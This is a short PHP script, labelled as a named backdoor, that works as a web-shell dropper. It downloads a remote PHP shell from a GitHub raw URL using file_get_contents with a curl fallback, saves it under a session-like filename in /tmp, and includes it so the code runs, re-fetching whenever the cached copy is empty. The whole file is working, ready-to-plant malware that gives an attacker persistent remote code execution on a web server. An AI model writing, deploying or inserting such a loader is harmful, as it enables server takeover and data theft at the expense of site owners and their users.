<?php
# Ramil Feyziyev Backdoor
# Bypass 406 Not Acceptable & Auto Delete Shell

$URL = 'https://raw.githubusercontent.com/cybercriminator/BaBa/master/dostshell.php';  # Backdoor URL
$TMP = '/tmp/sess_'.md5($_SERVER['HTTP_HOST']).'.php'; # dont change this !!
 
function M() {
    $FGT = @file_get_contents($GLOBALS['URL']);
    if(!$FGT) {
        echo `curl -k $(echo {$GLOBALS['URL']}) > {$GLOBALS['TMP']}`;
    } else {
        $HANDLE = fopen($GLOBALS['TMP'], 'w');
        fwrite($HANDLE, $FGT);
        fclose($HANDLE);
    }
    echo '<script>window.location="?rf";</script>';
}
 
if(file_exists($TMP)) {
    if(filesize($TMP) === 0) {
        unlink($TMP);
        M();
    } else {
        include($TMP);
    }
} else {
    M();
}
?>
